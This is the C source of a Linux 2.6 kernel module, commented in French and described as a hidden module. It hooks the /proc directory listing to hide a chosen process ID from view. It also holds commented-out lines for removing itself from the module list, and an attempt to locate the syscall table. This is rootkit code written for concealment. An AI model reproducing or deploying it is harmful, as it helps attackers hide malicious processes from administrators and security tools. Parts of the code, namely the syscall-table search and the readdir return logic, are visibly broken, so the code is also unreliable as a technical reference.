#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/proc_fs.h>
#include <linux/smp_lock.h>
#include <linux/delay.h>
#include <linux/syscalls.h>

MODULE_DESCRIPTION("Module caché pour noyau 2.6");
MODULE_AUTHOR("Olivier Pitton");
MODULE_LICENSE("GPL");

static int (*previous_readdir) (struct file *, void *, filldir_t);
static struct proc_dir_entry *proc_child_entry;
static int my_filldir(void* buf, const char* name, int nlen, loff_t off, ino_t ino, unsigned int x);

static filldir_t old_filldir;
static char* hidden;
module_param(hidden, charp, 0);

static int my_filldir(void* buf, const char* name, int nlen, loff_t off, ino_t ino, unsigned int x)
{
  if(!strcmp(hidden, name)) {
    return 0;
  }
  return old_filldir(buf, name, nlen, off, ino, x);
}

static void* find_sys_call_table(void)
{
  long* first;
  long* end;
  first = &unlock_kernel;
  end = &loops_per_jiffy;
  for(;first < end ; first++) {
    if(first == __NR_KILL) {
      printk(KERN_ALERT "TROUVE\n");
    }
  }
  return first;
}

static int my_readdir(struct file* fp, void* buf, filldir_t filldir)
{
  int ret;
  old_filldir = filldir;
  filldir_t new_filldir = (filldir_t) my_filldir;
  ret = previous_readdir(fp, buf, new_filldir);
  if(ret) {
    ret = previous_readdir(fp, buf, filldir);
  }
  return 1;
}

static struct proc_dir_entry* find_proc_dentry(void) 
{
  proc_child_entry = create_proc_entry("proc_entry", 0777, NULL);
  if(!proc_child_entry)
  {
    printk(KERN_INFO "Error creating proc entry");
    return NULL;
  }
  return proc_child_entry->parent;
}

static int __init hello_init(void)
{
  struct file_operations* fops;
  struct proc_dir_entry* proc_dir;
  struct module hide_module;
  
  hide_module = __this_module;
  if(hidden == NULL)
  {
    hidden = "603";
  }
  printk(KERN_ALERT "Nous allons cacher le processus %s!\n", hidden);
  //list_del(&(hide_module.mkobj.kobj.entry)); 
  //kobject_del(&(hide_module.mkobj.kobj));
  proc_dir = find_proc_dentry();
  fops = proc_dir->proc_fops;
  previous_readdir = fops->readdir;
  fops->readdir = my_readdir;
  find_sys_call_table();
  return 0;
}


static void __exit hello_exit(void)
{
  struct file_operations* fops;
  printk(KERN_ALERT "Goodbye, cruel world\n");
  fops = proc_child_entry->parent->proc_fops;
  fops->readdir = previous_readdir;
  remove_proc_entry("proc_entry",NULL);
}

module_init(hello_init);
module_exit(hello_exit);

